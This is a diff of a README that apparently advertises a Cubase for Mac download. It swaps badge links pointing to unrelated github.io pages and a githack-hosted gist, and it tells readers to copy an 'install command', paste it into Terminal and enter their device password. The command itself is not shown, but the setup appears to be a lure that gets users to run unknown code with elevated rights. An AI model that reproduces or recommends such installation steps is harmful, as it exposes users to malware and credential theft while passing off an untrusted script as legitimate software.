@@ -4,7 +4,7 @@
 
 Cubase for Mac is a professional DAW that powers modern music production with multitrack recording, MIDI sequencing, VST instruments, and a world-class MixConsole 🎛️. Use the button below to get the installer, then follow the steps for a smooth setup on macOS.
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-007AFF?style=for-the-badge&logo=apple)](https://juianaiud84.github.io/.github/cubase)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 If the button doesn’t work, follow the terminal method below to complete the installation.
 
@@ -23,7 +23,7 @@ If the button doesn’t work, follow the terminal method below to complete the i
 
 1. Click to get the install command:
 
-   [![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-1D1D1F?style=for-the-badge&logo=apple)](https://gistcdn.githack.com/temptation880/5f5a7dad66e66195ec88d6ab2e214a31/raw/970a010b9e0acf36323e04e712a10550b3924b18/install.html)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
